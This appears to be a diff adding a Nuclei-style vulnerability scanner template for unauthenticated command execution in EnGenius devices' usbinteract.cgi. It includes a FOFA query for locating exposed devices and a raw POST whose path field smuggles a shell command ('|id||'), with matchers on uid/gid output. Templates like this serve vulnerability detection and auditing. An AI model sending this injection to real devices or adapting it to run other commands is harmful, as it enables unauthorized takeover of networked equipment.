@@ -1,0 +1,33 @@
+id: EnGenius-usbinteract_cgi-rce
+
+info:
+  name: "EnGenius usbinteract.cgi 接口未授权远程代码执行"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/web/images/guest.png" && body="/web/images/admin.png"
+      EnGenius设备usbinteract.cgi接口因访问控制机制缺失，导致远程攻击者可通过构造恶意请求执行任意系统命令。该漏洞允许攻击者在目标系统写入持久化后门，最终实现对设备管理权限的完全接管。攻击链可能包含命令注入、文件上传及服务提权等多个阶段，建议立即应用官方安全补丁以阻断利用路径。
+  reference:
+  - https://mp.weixin.qq.com/s/ixrAvDm24biDRN6c2jxkNw
+  tags: EnGenius
+
+http:
+- raw:
+  - |
+    POST /web/cgi-bin/usbinteract.cgi HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+
+    action=7&path="|id||"
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'uid='
+    - 'gid='
+    condition: and
+  - type: status
+    status:
+    - 200
